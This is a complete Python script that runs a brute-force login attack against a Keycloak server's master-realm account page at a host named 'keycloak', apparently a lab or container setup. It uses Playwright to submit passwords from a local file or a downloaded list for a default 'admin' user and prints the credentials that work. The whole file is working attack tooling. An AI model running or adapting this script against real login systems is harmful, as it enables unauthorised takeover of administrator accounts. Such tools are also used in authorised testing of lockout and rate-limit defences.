#!/usr/bin/env python3

import requests
from playwright.sync_api import sync_playwright
import os
import sys

def get_passwords(password_source):
    """
    Retrieves a list of passwords from the specified source.
    Downloads from a URL or reads from a file path.
    """
    if password_source.startswith(('http://', 'https://')):
        print(f"Downloading password list from URL: {password_source}")
        try:
            response = requests.get(password_source)
            response.raise_for_status()  # Raises an exception for HTTP errors
            return response.text.splitlines()
        except requests.exceptions.RequestException as e:
            print(f"An error occurred while downloading the password list: {e}")
            return []
    else:
        print(f"Reading password list from file: {password_source}")
        try:
            with open(password_source, 'r', encoding='utf-8') as f:
                return f.read().splitlines()
        except FileNotFoundError:
            print(f"Error: The file '{password_source}' was not found.")
            return []
        except Exception as e:
            print(f"An error occurred while reading the file: {e}")
            return []

def main():
    """
    Attempts a brute-force attack to log in to Keycloak.
    """
    username = "admin"
    password_source = "password_list.txt"

    if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
        print("Usage: python3 brute-force-attack.py [username (optional, default: admin)] [password list file or URL (optional, default: password_list.txt)]")
        print("Example: ./brute-force-attack.py")
        print("Example: ./brute-force-attack.py admin")
        print("Example: ./brute-force-attack.py admin passwords.txt")
        print("Example: ./brute-force-attack.py admin https://example.com/passwords.txt")
        sys.exit(0)

    # Get password source from command-line arguments. Use default if not provided.
    if len(sys.argv) == 2:
        username = sys.argv[1]
    elif len(sys.argv) == 3:
        username = sys.argv[1]
        password_source = sys.argv[2]

    passwords = get_passwords(password_source)
    if not passwords:
        print("The password list is empty, exiting the process.")
        return

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()
        page.goto("http://keycloak:8080/auth/realms/master/account")

        print(f"Starting brute-force attack for user '{username}'...")

        for i, password in enumerate(passwords):
            if (i + 1) % 10 == 0:
                print(f"Completed {i + 1} attempts")

            page.fill('input#username', username)
            page.fill('input#password', password)
            page.click('input[type="submit"]')

            if page.url.endswith('/auth/realms/master/account/'):
                print("\n--- Login successful! ---")
                print(f"Username: {username}")
                print(f"Password: {password}")
                break

        if i == len(passwords) - 1:
            print("\nLogin failed for all passwords.")

        browser.close()

if __name__ == "__main__":
    main()
